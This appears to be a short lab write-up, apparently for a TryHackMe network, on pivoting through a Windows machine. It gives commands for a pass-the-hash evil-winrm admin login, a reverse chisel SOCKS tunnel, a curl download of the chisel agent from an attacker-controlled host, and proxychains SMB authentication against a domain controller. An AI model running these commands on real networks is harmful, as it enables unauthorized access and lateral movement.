# Pivoting

## Access to the Pivot Machine as Admin

{% code overflow="wrap" %}
```bash
evil-winrm -i wrk.tryhackme.loc -u 'Administrator' -H 'e75f25c6788a558e4f3f49714ed95e41'
```
{% endcode %}



## Chisel pivoting setup

### Set Proxy in attacker machine

{% code overflow="wrap" %}
```bash
chisel server --port 8000 -reverse
```
{% endcode %}



### Start Agent in pivot machine

Download the agent from malicious server

```
curl http://10.250.1.6/chisel_1.10.1_windows_amd64 -o chisel.exe

.\chisel.exe client 10.250.1.6:8000 R:socks
```



Try to authenticate to DC.

```bash
proxychains nxc smb 10.200.150.10 -u "gg" -p 'ii'
```

<figure><img src="../../../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>

The pivot works.
